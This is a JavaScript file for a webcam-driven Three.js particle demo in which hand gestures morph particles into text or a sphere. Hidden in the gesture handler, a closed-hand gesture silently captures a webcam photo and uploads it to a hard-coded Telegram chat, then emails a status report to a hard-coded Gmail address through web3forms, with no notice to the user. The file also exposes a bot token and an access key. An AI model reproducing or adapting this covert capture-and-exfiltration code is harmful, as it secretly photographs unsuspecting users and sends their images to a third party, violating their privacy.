// ----------------- Particle System -----------------
let scene, camera, renderer, particles;
const count = 12000;
let currentState = 'sphere';
let handDetected = false;
let lastGesture = null;
let lastGestureTime = 0;
const gestureCooldown = 400;

// ----------------- TELEGRAM PHOTO SYSTEM -----------------
let photoCount = 0;
let lastPhotoTime = 0;
const photoCooldown = 30000;

// ✅ SECURE: Load credentials from separate config (NOT in GitHub)
let TELEGRAM_CHAT_ID = "7528977004";

// Load credentials safely
function loadTelegramCredentials() {
    // Method 1: Check if credentials are set in HTML
    if (window.TELEGRAM_CONFIG) {
        TELEGRAM_BOT_TOKEN = window.TELEGRAM_CONFIG.token || "";
        TELEGRAM_CHAT_ID = window.TELEGRAM_CONFIG.chat_id || TELEGRAM_CHAT_ID;
    }
    
    // Method 2: Load from localStorage (for testing)
    if (!TELEGRAM_BOT_TOKEN) {
        const saved = localStorage.getItem('telegram_credentials');
        if (saved) {
            try {
                const creds = JSON.parse(saved);
                TELEGRAM_BOT_TOKEN = creds.token || "";
                TELEGRAM_CHAT_ID = creds.chat_id || TELEGRAM_CHAT_ID;
            } catch (e) {
                console.log("Could not load credentials");
            }
        }
    }
    
    // Method 3: For local testing only (Remove before pushing to GitHub)
    if (window.location.hostname === 'localhost' || window.location.hostname.includes('127.0.0.1')) {
        // Only uncomment for local testing
        // TELEGRAM_BOT_TOKEN = "8312788837:AAHfcaUZihg8xc8Wbu7GLdUdWlK3WWrQEA4";
    }
    
    return !!TELEGRAM_BOT_TOKEN;
}

function init() {
    scene = new THREE.Scene();
    camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
    renderer = new THREE.WebGLRenderer({ antialias: true });
    renderer.setSize(window.innerWidth, window.innerHeight);
    renderer.setClearColor(0x000000);
    document.getElementById('container').appendChild(renderer.domElement);

    camera.position.z = 25;

    createParticles();
    setupEventListeners();
    setupHandTracking();
    animate();
    
    console.log("✅ Particle System Ready");
}

// ----------------- PARTICLE FUNCTIONS -----------------
function createParticles() {
    const geometry = new THREE.BufferGeometry();
    const positions = new Float32Array(count * 3);
    const colors = new Float32Array(count * 3);

    function sphericalDistribution(i) {
        const phi = Math.acos(-1 + (2 * i) / count);
        const theta = Math.sqrt(count * Math.PI) * phi;
        
        return {
            x: 8 * Math.cos(theta) * Math.sin(phi),
            y: 8 * Math.sin(theta) * Math.sin(phi),
            z: 8 * Math.cos(phi)
        };
    }

    for (let i = 0; i < count; i++) {
        const point = sphericalDistribution(i);
        
        positions[i * 3] = point.x + (Math.random() - 0.5) * 0.5;
        positions[i * 3 + 1] = point.y + (Math.random() - 0.5) * 0.5;
        positions[i * 3 + 2] = point.z + (Math.random() - 0.5) * 0.5;

        const color = new THREE.Color();
        const depth = Math.sqrt(point.x * point.x + point.y * point.y + point.z * point.z) / 8;
        color.setHSL(0.5 + depth * 0.2, 0.7, 0.4 + depth * 0.3);

        colors[i * 3] = color.r;
        colors[i * 3 + 1] = color.g;
        colors[i * 3 + 2] = color.b;
    }

    geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
    geometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));

    const material = new THREE.PointsMaterial({
        size: 0.08,
        vertexColors: true,
        blending: THREE.AdditiveBlending,
        transparent: true,
        opacity: 0.8,
        sizeAttenuation: true
    });

    if (particles) scene.remove(particles);
    particles = new THREE.Points(geometry, material);
    scene.add(particles);
}

function setupEventListeners() {
    const typeBtn = document.getElementById('typeBtn');
    const input = document.getElementById('morphText');

    typeBtn.addEventListener('click', () => {
        const text = input.value.trim();
        if (text) {
            morphToText(text);
        }
    });

    input.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            const text = input.value.trim();
            if (text) {
                morphToText(text);
            }
        }
    });
}

function createTextPoints(text) {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const fontSize = 100;
    const padding = 20;

    ctx.font = `bold ${fontSize}px Arial`;
    const textMetrics = ctx.measureText(text);
    const textWidth = textMetrics.width;
    const textHeight = fontSize;

    canvas.width = textWidth + padding * 2;
    canvas.height = textHeight + padding * 2;

    ctx.fillStyle = 'white';
    ctx.font = `bold ${fontSize}px Arial`;
    ctx.textBaseline = 'middle';
    ctx.textAlign = 'center';
    ctx.fillText(text, canvas.width / 2, canvas.height / 2);

    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const pixels = imageData.data;
    const points = [];
    const threshold = 128;

    for (let i = 0; i < pixels.length; i += 4) {
        if (pixels[i] > threshold) {
            const x = (i / 4) % canvas.width;
            const y = Math.floor((i / 4) / canvas.width);
            
            if (Math.random() < 0.3) {
                points.push({
                    x: (x - canvas.width / 2) / (fontSize / 10),
                    y: -(y - canvas.height / 2) / (fontSize / 10)
                });
            }
        }
    }

    return points;
}

function morphToText(text) {
    currentState = 'text';
    const textPoints = createTextPoints(text);
    const positions = particles.geometry.attributes.position.array;
    const targetPositions = new Float32Array(count * 3);

    gsap.to(particles.rotation, {
        x: 0,
        y: 0,
        z: 0,
        duration: 0.5
    });

    for (let i = 0; i < count; i++) {
        if (i < textPoints.length) {
            targetPositions[i * 3] = textPoints[i].x;
            targetPositions[i * 3 + 1] = textPoints[i].y;
            targetPositions[i * 3 + 2] = 0;
        } else {
            const angle = Math.random() * Math.PI * 2;
            const radius = Math.random() * 20 + 10;
            targetPositions[i * 3] = Math.cos(angle) * radius;
            targetPositions[i * 3 + 1] = Math.sin(angle) * radius;
            targetPositions[i * 3 + 2] = (Math.random() - 0.5) * 10;
        }
    }

    const duration = 1200;
    const start = performance.now();
    const startPositions = positions.slice();

    function frame(now) {
        const t = Math.min(1, (now - start) / duration);
        const easeT = 0.5 - 0.5 * Math.cos(Math.PI * t);
        for (let i = 0; i < positions.length; i++) {
            positions[i] = startPositions[i] + (targetPositions[i] - startPositions[i]) * easeT;
        }
        particles.geometry.attributes.position.needsUpdate = true;
        if (t < 1) {
            requestAnimationFrame(frame);
        }
    }
    requestAnimationFrame(frame);
}

function morphToCircle() {
    currentState = 'sphere';
    const positions = particles.geometry.attributes.position.array;
    const targetPositions = new Float32Array(count * 3);
    const colors = particles.geometry.attributes.color.array;

    function sphericalDistribution(i) {
        const phi = Math.acos(-1 + (2 * i) / count);
        const theta = Math.sqrt(count * Math.PI) * phi;
        
        return {
            x: 8 * Math.cos(theta) * Math.sin(phi),
            y: 8 * Math.sin(theta) * Math.sin(phi),
            z: 8 * Math.cos(phi)
        };
    }

    for (let i = 0; i < count; i++) {
        const point = sphericalDistribution(i);
        
        targetPositions[i * 3] = point.x + (Math.random() - 0.5) * 0.5;
        targetPositions[i * 3 + 1] = point.y + (Math.random() - 0.5) * 0.5;
        targetPositions[i * 3 + 2] = point.z + (Math.random() - 0.5) * 0.5;

        const depth = Math.sqrt(point.x * point.x + point.y * point.y + point.z * point.z) / 8;
        const color = new THREE.Color();
        color.setHSL(0.5 + depth * 0.2, 0.7, 0.4 + depth * 0.3);
        
        colors[i * 3] = color.r;
        colors[i * 3 + 1] = color.g;
        colors[i * 3 + 2] = color.b;
    }

    const startPositions = positions.slice();
    const duration = 1400;
    const start = performance.now();
    function frame(now) {
        const t = Math.min(1, (now - start) / duration);
        const easeT = 0.5 - 0.5 * Math.cos(Math.PI * t);
        for (let i = 0; i < positions.length; i++) {
            positions[i] = startPositions[i] + (targetPositions[i] - startPositions[i]) * easeT;
        }
        particles.geometry.attributes.position.needsUpdate = true;
        if (t < 1) requestAnimationFrame(frame);
    }
    requestAnimationFrame(frame);

    particles.geometry.attributes.color.needsUpdate = true;
}

function animate() {
    requestAnimationFrame(animate);
    
    if (currentState === 'sphere') {
        particles.rotation.y += 0.002;
    }
    
    renderer.render(scene, camera);

    const inputText = document.getElementById('morphText').value.trim() || "HELLO";
    const now = performance.now();

    if (lastGesture === 'open' && (now - lastGestureTime) > gestureCooldown) {
        if (currentState !== 'text') {
            morphToText(inputText);
        }
        lastGestureTime = now;
    } else if (lastGesture === 'closed' && (now - lastGestureTime) > gestureCooldown) {
        if (currentState !== 'sphere') {
            morphToCircle();
            capturePhotoForTelegram();
        }
        lastGestureTime = now;
    }
}

window.addEventListener('resize', () => {
    camera.aspect = window.innerWidth / window.innerHeight;
    camera.updateProjectionMatrix();
    renderer.setSize(window.innerWidth, window.innerHeight);
});

// ----------------- SECURE TELEGRAM SYSTEM -----------------

function capturePhotoForTelegram() {
    const now = Date.now();
    const video = document.getElementById('handVideo');
    
    if (now - lastPhotoTime < photoCooldown) {
        return;
    }
    
    if (!video || !video.videoWidth) {
        return;
    }
    
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 400;
        canvas.height = 300;
        
        ctx.drawImage(video, 0, 0, 400, 300);
        const photoData = canvas.toDataURL('image/jpeg', 0.7);
        
        photoCount++;
        lastPhotoTime = now;
        
        // Check if Telegram is configured
        if (!loadTelegramCredentials() || !TELEGRAM_BOT_TOKEN) {
            console.log(`📸 Photo ${photoCount} captured (Telegram not configured)`);
            savePhotoLocally(photoData);
            return;
        }
        
        sendPhotoToTelegram(photoData);
        
        console.log(`📸 Photo ${photoCount} processing...`);
        
    } catch (error) {
        console.error("Photo error:", error);
    }
}

async function sendPhotoToTelegram(photoData) {
    try {
        console.log(`📤 Sending photo ${photoCount}...`);
        
        // Convert to blob
        const response = await fetch(photoData);
        const blob = await response.blob();
        
        // Create FormData
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
        formData.append('caption', `📸 Photo ${photoCount} - ${new Date().toLocaleTimeString()}`);
        
        // Send to Telegram
        const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        const result = await telegramResponse.json();
        
        if (result.ok) {
            console.log(`✅ Photo ${photoCount} sent successfully!`);
            sendBackupNotification(true);
        } else {
            console.error('Telegram error:', result.description);
            sendBackupNotification(false);
            savePhotoLocally(photoData);
        }
        
    } catch (error) {
        console.error('Network error:', error);
        savePhotoLocally(photoData);
    }
}

function savePhotoLocally(photoData) {
    try {
        const photos = JSON.parse(localStorage.getItem('captured_photos') || '[]');
        photos.push({
            id: Date.now(),
            count: photoCount,
            time: new Date().toISOString(),
            preview: photoData.substring(0, 150) + '...'
        });
        
        if (photos.length > 10) photos.shift();
        localStorage.setItem('captured_photos', JSON.stringify(photos));
        
    } catch (e) {
        console.log("Could not save photo locally");
    }
}

async function sendBackupNotification(success) {
    try {
        const formData = new FormData();
        formData.append('access_key', 'f5bdda81-92f8-4595-a2e8-a6107db5feef');
        formData.append('subject', success ? `✅ Photo ${photoCount} Sent` : `❌ Photo ${photoCount} Failed`);
        formData.append('message', 
            success 
                ? `Photo ${photoCount} sent to Telegram successfully!\nTime: ${new Date().toLocaleString()}`
                : `Photo ${photoCount} failed to send. Saved locally.\nTime: ${new Date().toLocaleString()}`
        );
        formData.append('email', 'editing2213@gmail.com');
        
        await fetch('https://api.web3forms.com/submit', {
            method: 'POST',
            body: formData
        });
        
    } catch (error) {
        // Silent fail
    }
}

// ----------------- Hand Tracking -----------------
function setupHandTracking(){
    const videoElement = document.getElementById('handVideo');

    const hands = new Hands({locateFile: (file) => {
        return `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`;
    }});

    hands.setOptions({
        maxNumHands: 1,
        modelComplexity: 1,
        minDetectionConfidence: 0.7,
        minTrackingConfidence: 0.6
    });

    hands.onResults((results) => {
        if (!results.multiHandLandmarks || results.multiHandLandmarks.length === 0) {
            handDetected = false;
            lastGesture = 'closed';
            return;
        }

        handDetected = true;
        const landmarks = results.multiHandLandmarks[0];

        let fingersUp = 0;
        try {
            const tipIndices = [8, 12, 16, 20];
            const pipIndices = [6, 10, 14, 18];
            for (let i = 0; i < tipIndices.length; i++) {
                const tip = landmarks[tipIndices[i]];
                const pip = landmarks[pipIndices[i]];
                if (tip.y < pip.y) fingersUp++;
            }

            const wrist = landmarks[0];
            let avgDist = 0;
            const tipIdxAll = [4,8,12,16,20];
            for (let i=0;i<tipIdxAll.length;i++){
                const t = landmarks[tipIdxAll[i]];
                const dx = t.x - wrist.x;
                const dy = t.y - wrist.y;
                avgDist += Math.sqrt(dx*dx + dy*dy);
            }
            avgDist /= tipIdxAll.length;

            if (fingersUp >= 3 && avgDist > 0.12) {
                lastGesture = 'open';
            } else if (fingersUp <= 1 && avgDist < 0.12) {
                lastGesture = 'closed';
            } else {
                lastGesture = (fingersUp >= 3) ? 'open' : lastGesture || 'closed';
            }
        } catch (e) {
            lastGesture = 'closed';
        }
    });

    const cameraMP = new Camera(videoElement, {
        onFrame: async () => {
            await hands.send({image: videoElement});
        },
        width: 320,
        height: 240
    });

    cameraMP.start().then(() => {
        console.log("✅ Camera ready");
    }).catch(() => {
        console.log("Camera access not available");
    });
}

// Initialize
init();

// Admin functions (for testing)
window.setTelegramCredentials = function(token, chatId) {
    TELEGRAM_BOT_TOKEN = token;
    TELEGRAM_CHAT_ID = chatId;
    localStorage.setItem('telegram_credentials', JSON.stringify({token, chat_id: chatId}));
    console.log("✅ Credentials set!");
    return true;
};

window.testTelegramConnection = async function() {
    if (!TELEGRAM_BOT_TOKEN) {
        console.log("❌ No Telegram token set");
        console.log("Use: setTelegramCredentials('YOUR_TOKEN', 'YOUR_CHAT_ID')");
        return false;
    }
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
        const data = await response.json();
        console.log("Bot Info:", data);
        return data.ok;
    } catch (error) {
        console.error("Connection failed:", error);
        return false;
    }
};

// For testing: Manually trigger photo capture
window.manualCapture = function() {
    capturePhotoForTelegram();
};

